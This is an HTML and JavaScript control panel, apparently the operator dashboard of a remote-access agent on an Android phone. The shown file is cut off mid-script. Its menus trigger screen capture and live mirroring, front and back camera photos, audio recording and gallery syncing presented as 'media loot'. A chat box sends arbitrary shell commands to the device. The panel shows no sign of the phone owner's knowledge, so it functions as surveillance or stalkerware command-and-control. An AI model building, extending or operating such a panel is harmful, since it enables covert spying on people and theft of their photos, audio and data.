<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NOIR COMMANDER | v16.0.03 ELITE</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@300;500;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #020205;
            --panel: rgba(10, 10, 18, 0.85);
            --accent: #00f2ff;
            --accent-glow: rgba(0, 242, 255, 0.3);
            --gold: #ffcc00;
            --gold-glow: rgba(255, 204, 0, 0.2);
            --danger: #ff0055;
            --success: #00ffaa;
            --text: #e0e0f0;
            --border: rgba(0, 242, 255, 0.15);
            --shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.8);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Rajdhani', sans-serif; }
        body {
            background: var(--bg);
            color: var(--text);
            height: 100vh;
            overflow: hidden;
            background-image: 
                radial-gradient(circle at 10% 10%, #0a0a25 0%, transparent 50%),
                radial-gradient(circle at 90% 90%, #1a0505 0%, transparent 50%),
                url('https://www.transparenttextures.com/patterns/carbon-fibre.png');
            animation: bgShift 20s infinite alternate ease-in-out;
        }

        @keyframes bgShift {
            0% { background-position: 0% 0%; }
            100% { background-position: 5% 5%; }
        }

        .commander-layout {
            display: grid;
            grid-template-columns: 85px 260px 1fr;
            height: 100vh;
            padding: 15px;
            gap: 15px;
        }

        .glass {
            background: var(--panel);
            backdrop-filter: blur(25px);
            -webkit-backdrop-filter: blur(25px);
            border: 1px solid var(--border);
            border-radius: 16px;
            display: flex;
            flex-direction: column;
            overflow: hidden;
            box-shadow: var(--shadow);
            transition: border-color 0.3s;
        }
        .glass:hover { border-color: rgba(0, 242, 255, 0.3); }

        /* MASTER MENU (Left Bar) */
        .master-menu {
            align-items: center;
            padding: 25px 0;
            gap: 25px;
        }
        .menu-icon {
            width: 50px; height: 50px;
            display: flex; align-items: center; justify-content: center;
            cursor: pointer; border-radius: 14px;
            border: 1px solid transparent; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            font-size: 1.4rem; color: #667;
            position: relative;
        }
        .menu-icon:hover { color: #fff; transform: translateY(-2px); }
        .menu-icon.active {
            background: rgba(0, 242, 255, 0.15);
            border-color: var(--accent);
            color: var(--accent);
            box-shadow: 0 0 20px var(--accent-glow);
        }
        .menu-icon.active::after {
            content: ''; position: absolute; left: -10px; top: 15px; bottom: 15px; width: 3px;
            background: var(--accent); border-radius: 0 5px 5px 0;
            box-shadow: 0 0 10px var(--accent);
        }

        /* SUB-MENU (List) */
        .sub-menu { padding: 25px; background: rgba(5, 5, 10, 0.4); }
        .menu-title {
            font-family: 'Orbitron', sans-serif;
            font-size: 0.8rem; color: var(--gold);
            margin-bottom: 30px; letter-spacing: 3px;
            display: flex; align-items: center; gap: 10px;
            text-transform: uppercase;
        }
        .menu-item {
            padding: 14px 18px; border-radius: 10px;
            background: rgba(255,255,255,0.03);
            border: 1px solid rgba(255,255,255,0.05);
            color: #aaa; cursor: pointer;
            font-size: 0.85rem; margin-bottom: 12px;
            transition: all 0.2s ease;
            display: flex; justify-content: space-between; align-items: center;
        }
        .menu-item:hover {
            background: rgba(0, 242, 255, 0.08);
            color: #fff; border-color: var(--accent);
            transform: scale(1.02);
        }

        /* MAIN CONTENT AREA */
        .content-area {
            position: relative;
            padding: 25px;
            display: grid;
            grid-template-rows: auto 1fr;
            gap: 25px;
        }

        .page-header {
            display: flex; justify-content: space-between; align-items: center;
            border-bottom: 1px solid var(--border); padding-bottom: 20px;
        }
        .page-title { 
            font-family: 'Orbitron', sans-serif; font-size: 1.4rem; color: #fff; 
            letter-spacing: 2px; text-shadow: 0 0 10px rgba(255,255,255,0.2);
        }

        .view-frame { 
            flex: 1; border-radius: 12px; overflow: hidden; 
            background: rgba(0,0,0,0.6); position: relative; 
            border: 1px solid rgba(255,255,255,0.03);
        }
        
        /* SPECIFIC VIEWS */
        .vision-feed { width: 100%; height: 100%; object-fit: contain; image-rendering: pixelated; }
        .chat-container { display: flex; flex-direction: column; height: 100%; }
        .chat-msgs { flex: 1; overflow-y: auto; padding: 25px; display: flex; flex-direction: column; gap: 15px; }
        .msg { padding: 12px 18px; border-radius: 12px; font-size: 0.9rem; max-width: 85%; line-height: 1.4; }
        .msg.agent { align-self: flex-start; background: rgba(0, 242, 255, 0.07); border: 1px solid var(--border); color: var(--accent); }
        .msg.user { align-self: flex-end; background: rgba(255, 204, 0, 0.07); border: 1px solid rgba(255, 204, 0, 0.2); color: var(--gold); }
        .chat-input { padding: 20px; display: flex; gap: 15px; border-top: 1px solid var(--border); background: rgba(0,0,0,0.2); }
        .chat-input input { flex: 1; background: none; border: none; color: #fff; outline: none; font-size: 1rem; }

        .loot-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 20px; padding: 15px; }
        .loot-card { 
            aspect-ratio: 16/9; border-radius: 12px; overflow: hidden; 
            border: 1px solid var(--border); cursor: pointer; position: relative;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
        }
        .loot-card img { width: 100%; height: 100%; object-fit: cover; transition: 0.5s; }
        .loot-card:hover img { transform: scale(1.1) rotate(1deg); }

        /* STATUS PILLS */
        .status-badge {
            padding: 6px 14px; border-radius: 20px; font-size: 0.75rem; font-weight: 700;
            display: flex; align-items: center; gap: 8px; border: 1px solid var(--accent); color: var(--accent);
            text-transform: uppercase; letter-spacing: 1px; transition: 0.3s;
        }
        .status-badge.success { border-color: var(--success); color: var(--success); }
        .status-badge.danger { border-color: var(--danger); color: var(--danger); }

        .browser-frame { width: 100%; height: 100%; border: none; border-radius: 12px; }

        /* SCROLLBAR */
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: rgba(0,0,0,0.2); }
        ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 10px; }
        ::-webkit-scrollbar-thumb:hover { background: var(--accent); }
    </style>
    <style>
        /* [v14.0 PRO] Floating Mirror Window */
        .mirror-window {
            position: fixed; top: 20px; right: 20px; width: 280px; height: 600px;
            background: #000; border: 2px solid var(--accent); border-radius: 20px;
            box-shadow: 0 0 30px rgba(0, 242, 255, 0.3); z-index: 1000;
            display: none; flex-direction: column; overflow: hidden;
            transition: 0.3s;
        }
        .mirror-header {
            padding: 10px; background: rgba(0, 242, 255, 0.1); display: flex; 
            justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border);
        }
        .mirror-body { flex: 1; position: relative; }
        .mirror-img { width: 100%; height: 100%; object-fit: cover; }
        .mirror-status { 
            position: absolute; bottom: 10px; left: 10px; font-size: 0.6rem; 
            color: var(--success); text-shadow: 0 0 5px #000; 
        }
        
        .reconnect-overlay {
            position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 2000;
            display: none; justify-content: center; align-items: center;
            color: var(--accent); font-family: 'Orbitron', sans-serif;
        }
    </style>
</head>
<body>

    <div id="reconnect-ui" class="reconnect-overlay">
        <div style="text-align:center;">
            <div style="font-size:1.5rem; margin-bottom:10px;">⚠️ CONNECTION LOST</div>
            <div class="status-badge" style="display:inline-flex;">RE-ESTABLISHING NEURAL LINK...</div>
        </div>
    </div>

    <div id="floating-mirror" class="mirror-window">
        <div class="mirror-header">
            <span style="font-size:0.7rem; color:var(--accent);">🔴 LIVE MIRROR</span>
            <div style="display:flex; gap:10px;">
                <span onclick="syncStatus()" style="cursor:pointer; color:var(--success); font-size:0.7rem;">🔄</span>
                <span onclick="toggleMirror()" style="cursor:pointer; color:#ff4444;">✖</span>
            </div>
        </div>
        <div class="mirror-body">
            <div id="mirror-loading" style="position:absolute; inset:0; display:flex; justify-content:center; align-items:center; background:rgba(0,0,0,0.5); z-index:5;">
                <div class="status-badge">BUFFERING...</div>
            </div>
            <img id="mirror-stream" class="mirror-img" src="" alt="Live Stream" onload="document.getElementById('mirror-loading').style.display='none'">
            <div id="mirror-ts" class="mirror-status">SYNCING...</div>
        </div>
    </div>

    <div class="commander-layout">
        <!-- ... existing layout ... -->
        <nav class="glass master-menu">
            <div class="menu-icon active" onclick="showPage('vision', this)" title="Vision Hub">👁️</div>
            <div class="menu-icon" onclick="showPage('sensors', this)" title="Sensors">📡</div>
            <div class="menu-icon" onclick="showPage('loot', this)" title="Media Loot">📦</div>
            <div class="menu-icon" onclick="showPage('chat', this)" title="Intelligence Interaction">💬</div>
            <div class="menu-icon" onclick="showPage('evolution', this)" title="Neural Evolution">🧬</div>
            <div class="menu-icon" onclick="showPage('browser', this)" title="Global Research">🌐</div>
            <div class="menu-icon" onclick="showPage('system', this)" title="System Matrix">⚙️</div>
        </nav>

        <aside class="glass sub-menu" id="sub-menu-container"></aside>

        <main class="glass content-area">
            <header class="page-header">
                <div class="page-title" id="page-title">VISION HUB</div>
                <div style="display:flex; gap:15px; align-items:center;">
                    <button onclick="toggleMirror()" class="status-badge" style="background:none; cursor:pointer; border-color:var(--accent); color:var(--accent);">📺 POP-OUT MIRROR</button>
                    <div class="status-badge" id="main-status-badge">
                        <span id="status-dot" style="width: 8px; height: 8px; background: var(--success); border-radius: 50%;"></span>
                        <span id="status-text">SYNC: REDMI_NOTE_14_ELITE_V16</span>
                    </div>
                </div>
            </header>
            
            <div class="view-frame" id="main-view"></div>
        </main>
    </div>

    <script>
        const API = "/api";
        let currentPage = 'vision';
        let isMirroring = false;
        let failCount = 0;

        function toggleMirror() {
            const m = document.getElementById('floating-mirror');
            isMirroring = !isMirroring;
            m.style.display = isMirroring ? 'flex' : 'none';
        }

        const PAGES = {
            vision: {
                title: "VISION HUB",
                menu: [
                    { label: "Capture Screen", cmd: 'screenshot' },
                    { label: "Pop-out Mirror", cmd: 'mirror_ui', custom: toggleMirror },
                    { label: "Extract UI Metadata", cmd: 'ui_dump' }
                ],
                render: () => `<img id="v-stream" class="vision-feed" src="/api/asset/latest" alt="Vision Stream">`
            },
            sensors: {
                title: "SENSOR ARRAY",
                menu: [
                    { label: "Back Camera Photo", cmd: 'camera_back' },
                    { label: "Front Camera Photo", cmd: 'camera_front' },
                    { label: "Record Audio (10s)", cmd: 'audio_record' }
                ],
                render: () => `<div style="padding:40px; text-align:center; color:#556;">SENSOR STREAM ACTIVE.</div>`
            },
            loot: {
                title: "MEDIA LOOT",
                menu: [
                    { label: "Sync Gallery", cmd: 'gallery_sync' },
                    { label: "Fetch All Assets", cmd: 'assets_fetch' }
                ],
                render: () => `<div class="loot-grid" id="loot-grid">Loading assets...</div>`
            },
            chat: {
                title: "NEURAL INTERACTION",
                menu: [
                    { label: "Clear History", cmd: 'chat_clear' }
                ],
                render: () => `
                    <div class="chat-container">
                        <div class="chat-msgs" id="chat-box"></div>
                        <div class="chat-input">
                            <input type="text" id="chat-in" placeholder="Query agent..." onkeypress="handleIn(event)">
                            <button onclick="sendChat()" class="menu-item" style="margin:0; width:auto;">SEND</button>
                        </div>
                    </div>
                `
            },
            evolution: {
                title: "NEURAL EVOLUTION",
                menu: [
                    { label: "Trigger Learning", cmd: 'learn' },
                    { label: "Optimize Logic", cmd: 'optimize' }
                ],
                render: () => `
                    <div style="padding:25px;">
                        <h4 style="color:var(--gold);">Skill Manifest:</h4>
                        <div id="skill-box">Loading...</div>
                        <h4 style="color:var(--gold); margin-top:20px;">Upgrade Proposals:</h4>
                        <div id="proposal-box">Analyzing...</div>
                    </div>
                `
            },
            browser: {
                title: "GLOBAL RESEARCH",
                menu: [
                    { label: "Gemini AI", url: 'https://gemini.google.com' },
                    { label: "YouTube Matrix", url: 'https://www.youtube.com/embed/dQw4w9WgXcQ' }
                ],
                render: () => `<iframe id="b-frame" class="browser-frame" src="https://www.google.com/search?q=ai+agent&igu=1"></iframe>`
            },
            system: {
                title: "SYSTEM MATRIX",
                menu: [
                    { label: "Neural Heal", cmd: 'heal' },
                    { label: "Sync Core", cmd: 'update' }
                ],
                render: () => `
                    <div style="padding:25px; display:grid; grid-template-columns:1fr 1fr 1fr; gap:20px;">
                        <div class="glass" style="padding:15px; border-left:3px solid var(--gold);">
                            <div style="font-size:0.6rem; opacity:0.7;">CPU LOAD</div>
                            <div id="s-cpu" style="font-size:1.2rem; font-weight:bold;">--</div>
                        </div>
                        <div class="glass" style="padding:15px; border-left:3px solid var(--gold);">
                            <div style="font-size:0.6rem; opacity:0.7;">RAM USAGE</div>
                            <div id="s-ram" style="font-size:1.2rem; font-weight:bold;">--</div>
                        </div>
                        <div class="glass" style="padding:15px; border-left:3px solid var(--gold);">
                            <div style="font-size:0.6rem; opacity:0.7;">BATTERY</div>
                            <div id="s-bat" style="font-size:1.2rem; font-weight:bold;">--</div>
                        </div>
                    </div>
                    <div class="glass" style="margin:0 25px 25px; padding:15px; flex:1; display:flex; flex-direction:column;">
                        <div style="color:var(--gold); font-size:0.7rem; margin-bottom:10px; display:flex; justify-content:space-between;">
                            <span>DIAGNOSTIC TELEMETRY (REAL-TIME)</span>
                            <span style="cursor:pointer;" onclick="clearLogs()">CLEAR</span>
                        </div>
                        <div id="log-terminal" style="flex:1; background:rgba(0,0,0,0.5); font-family:monospace; font-size:0.7rem; padding:10px; overflow-y:auto; color:#0f0; min-height:200px; border:1px solid rgba(255,215,0,0.1);">
                            [SYSTEM] Noir Sovereign ELITE v16.0.03 Online.
                        </div>
                    </div>
                `
            }
        };

        function showPage(pageId, el) {
            currentPage = pageId;
            const page = PAGES[pageId];
            document.querySelectorAll('.menu-icon').forEach(i => i.classList.remove('active'));
            if(el) el.classList.add('active');
            document.getElementById('page-title').innerText = page.title;
            const sub = document.getElementById('sub-menu-container');
            sub.innerHTML = `<div class="menu-title">${pageId.toUpperCase()}</div>` + 
                page.menu.map(item => `
                    <div class="menu-item" onclick="${item.custom ? `toggleMirror()` : item.url ? `loadURL('${item.url}')` : `executeCmd('${item.cmd}', ${JSON.stringify(item.params || {})})`}">
                        ${item.label}
                    </div>
                `).join('');
            document.getElementById('main-view').innerHTML = page.render();
            if(pageId === 'loot') loadLoot();
            if(pageId === 'evolution') loadEvolution();
        }

        async function executeCmd(type, params={}) {
            // Visual Pulse: Provide instant feedback
            const term = document.getElementById('log-terminal');
            if(term) {
                const d = document.createElement('div');
                d.style.color = '#aaa';
                d.innerText = `> SENDING: ${type.toUpperCase()}...`;
                term.prepend(d);
            }
            
            try {
                const res = await fetch(`${API}/command`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ action: { type, ...params }, description: type.toUpperCase() })
                });
                return await res.json();
            } catch (e) { 
                updateTerminal("Connection to command bridge lost.", "#f00");
            }
        }

        async function syncStatus() {
            try {
                const r = await fetch(`${API}/status`);
                const d = await r.json();
                failCount = 0;
                document.getElementById('reconnect-ui').style.display = 'none';
                
                const dot = document.getElementById('status-dot');
                const text = document.getElementById('status-text');

                if(d.online) {
                    dot.style.background = 'var(--success)';
                    dot.style.boxShadow = '0 0 10px var(--success)';
                    text.innerText = `LINK ACTIVE: ${d.agent ? d.agent.name : 'AGENT'}`;
                } else {
                    dot.style.background = 'var(--danger)';
                    dot.style.boxShadow = '0 0 10px var(--danger)';
                    text.innerText = 'NEURAL LINK: OFFLINE';
                }

                if(d.agent) {
                    const s = d.agent.stats || {};
                    // Use telemetry from results if more recent, fallback to registration stats
                    if(document.getElementById('s-cpu')) {
                        const val = s.cpu || 0;
                        document.getElementById('s-cpu').innerText = `${val}%`;
                        document.getElementById('s-cpu').parentElement.style.borderColor = val > 80 ? 'var(--danger)' : 'var(--gold)';
                    }
                    if(document.getElementById('s-ram')) {
                        const val = s.ram || 0;
                        document.getElementById('s-ram').innerText = `${val}%`;
                        document.getElementById('s-ram').parentElement.style.borderColor = val > 80 ? 'var(--danger)' : 'var(--gold)';
                    }
                    if(document.getElementById('s-bat')) {
                        const val = s.bat || '--';
                        document.getElementById('s-bat').innerText = `${val}%`;
                    }
                    
                    if(d.agent.last_screenshot) {
                        const assetUrl = `${API}/asset/${d.agent.last_screenshot}?t=${Date.now()}`;
                        if(currentPage === 'vision') {
                            const img = document.getElementById('v-stream');
                            if(img && img.src !== assetUrl) img.src = assetUrl;
                        }
                        if(isMirroring) {
                            document.getElementById('mirror-stream').src = assetUrl;
                            document.getElementById('mirror-ts').innerText = `SYNCED @ ${new Date().toLocaleTimeString()}`;
                        }
                    }
                }

                // Process Latest Command Results into Terminal
                if(d.commands && d.commands.length > 0) {
                    const processedIds = JSON.parse(localStorage.getItem('noir_processed_cmds') || '[]');
                    d.commands.forEach(cmd => {
                        if(processedIds.includes(cmd.id)) return;
                        
                        if(cmd.status === 'done' && cmd.result) {
                            const res = JSON.parse(cmd.result);
                            const msg = `[${cmd.description}] ${res.success ? '✓ SUCCESS' : '✗ FAILED'} | ${res.output || res.error || ''}`;
                            updateTerminal(msg, res.success ? 'var(--success)' : 'var(--danger)');
                            
                            if(res.telemetry) {
                                updateTelemetry(res.telemetry);
                            }
                            processedIds.push(cmd.id);
                        } else if(cmd.status === 'failed') {
                            updateTerminal(`[${cmd.description}] CRITICAL INTERRUPT`, 'var(--danger)');
                            processedIds.push(cmd.id);
                        }
                    });
                    // Keep only last 50 processed IDs
                    localStorage.setItem('noir_processed_cmds', JSON.stringify(processedIds.slice(-50)));
                }
                
                if(currentPage === 'system') fetchLogs();
            } catch(e) {
                failCount++;
                if(failCount > 3) document.getElementById('reconnect-ui').style.display = 'flex';
            }
        }

        function updateTelemetry(t) {
            if(document.getElementById('s-cpu')) document.getElementById('s-cpu').innerText = `${t.cpu}%`;
            if(document.getElementById('s-ram')) document.getElementById('s-ram').innerText = `${t.ram}%`;
            if(document.getElementById('s-bat')) document.getElementById('s-bat').innerText = `${t.bat || '--'}%`;
        }

        async function fetchLogs() {
            const terminal = document.getElementById('log-terminal');
            if(!terminal || currentPage !== 'system') return;
            try {
                const r = await fetch(`${API}/logs`);
                const logs = await r.json();
                terminal.innerHTML = logs.map(l => {
                    const color = l.level === 'CRITICAL' ? '#f00' : l.level === 'WARNING' ? '#ff0' : '#0f0';
                    return `<div style="color:${color}; border-bottom:1px solid rgba(255,255,255,0.05); margin-bottom:5px;">
                        [${new Date(l.created_at + 'Z').toLocaleTimeString()}] [${l.level}] ${l.message}
                    </div>`;
                }).join('') || '[EMPTY LOG]';
            } catch(e) {}
        }

        function updateTerminal(msg, color='#0f0') {
            const term = document.getElementById('log-terminal');
            if(!term) return;
            // Simple check to avoid duplicates if same result polled multiple times
            if(term.innerText.includes(msg.substring(0, 20))) return;
            const d = document.createElement('div');
            d.style.color = color;
            d.innerText = `> ${msg}`;
            term.prepend(d);
        }

        async function loadLoot() {
            const r = await fetch(`${API}/assets`);
            const d = await r.json();
            const grid = document.getElementById('loot-grid');
            if(grid) grid.innerHTML = d.map(a => `<div class="loot-card" onclick="window.open('${API}/asset/${a.key}')"><img src="${API}/asset/${a.key}"></div>`).join('');
        }

        async function loadEvolution() {
            const r = await fetch(`${API}/skills`);
            const d = await r.json();
            document.getElementById('skill-box').innerHTML = d.active.map(s => `<span>${s}</span>`).join(' ');
            document.getElementById('proposal-box').innerText = d.proposal;
        }

        function handleIn(e) { if(e.key === 'Enter') sendChat(); }
        async function sendChat() {
            const input = document.getElementById('chat-in');
            const val = input.value.trim();
            if(!val) return;
            addMsg(val, 'user');
            input.value = '';
            executeCmd('shell', {cmd: val});
        }
        function addMsg(text, role) {
            const box = document.getElementById('chat-box');
            if(!box) return;
            const d = document.createElement('div');
            d.className = `msg ${role}`; d.innerText = text;
            box.appendChild(d); box.scrollTop = box.scrollHeight;
        }

        // v16.0.02 ELITE: Neural Link Sanitization
        if(localStorage.getItem('noir_version') !== '16.0.02') {
            localStorage.clear();
            localStorage.setItem('noir_version', '16.0.02');
